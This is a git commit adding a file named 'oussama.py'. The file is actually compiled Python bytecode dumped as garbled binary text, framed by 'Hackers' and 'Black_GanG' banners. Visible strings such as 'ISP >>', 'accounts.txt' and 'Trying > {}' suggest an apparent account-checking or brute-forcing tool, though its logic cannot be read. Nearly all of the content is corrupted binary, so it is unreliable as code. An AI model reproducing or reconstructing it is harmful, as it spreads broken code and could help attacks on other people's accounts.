766b7aa1b5f67a892f3ff116eba18abb648ab91f
whiteoussama <44711273+whiteoussama@users.noreply.github.com>
2018-11-03 14:37:08 +0000

    Create oussama.py

---
+++ oussama.py
@@ -0,0 +1,38 @@
+^C�
+���[c^@^@^@^@^@^@^@^@^E^@^@^@@^@^@^@s�^A^@^@d^@^@d^A^@l^@^@Z^@^@d^@^@d^A^@l^A^@Z^A^@d^@^@d^A^@l^                       $
+^@d^E^@d^F^@�^B^@Z^K^@e^F^@j^G^@d^B^@�^A^@^Ad^G^@GHd^H^@�^@^@Z^L^@d     ^@�^@^@Z
+^@x�^@e^N^@r�^Ae^O^@e   ^@�^A^@e^O^@e^D^@j^P^@d
+^@d^K^@�^B^@�^A^@^WZ^Q^@e^R^@e^Q^@�^A^@d^L^@k^B^@r�^@e^Q^@Z^Q^@n�^@e^R^@e^Q^@�^A^@d
+^@k^B^@r^P^Ae^O^@e^Q^@�^A^@d^N^@^WZ^Q^@no^@e^R^@e^Q^@�^A^@d^O^@k^B^@r5^Ae^O^@e^Q^@�^A^@d^P^@^WZ^                       $
+^@e^Q^@�^A^@^Aq�^@Wd^A^@S(^U^@^@^@i����Nt^E^@^@^@clearsE^A^@^@
+
+           #######################################
+           #                                     #
+           # By : oussama_arkoubi
+           @Black_GanG        #
+           #                                     #
+           # By : oussama _Arkoubi @Arkoubi _security #
+           #                                     #
+           #      [*] oussama Hackers [*]       #
+           #                                     #
+           #######################################
+
+s^K^@^@^@[*] ISP >> s^L^@^@^@accounts.txtt^A^@^@^@ws�^A^@^@
+
+           #######################################
+           #                                     #
+           # By : Arkoubi _oussama @Black_gang       #
+           #                                     #
+           # By : oussama_arkoubi @Oussama_security #
+           #                                     #
+           #      [*] Maroccain Hackers [*]       #
+           #                                     #
+           #######################################
+
+c^A^@^@^@^C^@^@^@^E^@^@^@C^@^@^@s�^@^@^@y�^@t^@^@j^A^@j^B^@d^A^@j^C^@t^D^@�^A^@�^A^@^At^@^@j^A^                        $
+^@�^A^@}^B^@|^B^@d^D^@^Yr�^@d^E^@t^D^@^WGHd^F^@j^C^@|^B^@d^D^@^Y�^A^@GHt^K^@j^B^@t^D^@d^G^@^W�^                        $
+^@r�^@^A^A^Ad^H^@GHn%^@^Dt
+^@k
+^@r�^@^A^A^At^K^@j^N^@�^@^@^At^@^@j^O^@�^@^@^An^A^@Xd^@^@S(     ^@^@^@Ns^N^@^@^@[*]Trying > {}s                        $
+s^A^@^@^@
+t^@^@^@^@(^P^@^@^@t^C^@^@^@syst^F^@^@^@stdoutt^E^@^@^@writet^F^@^
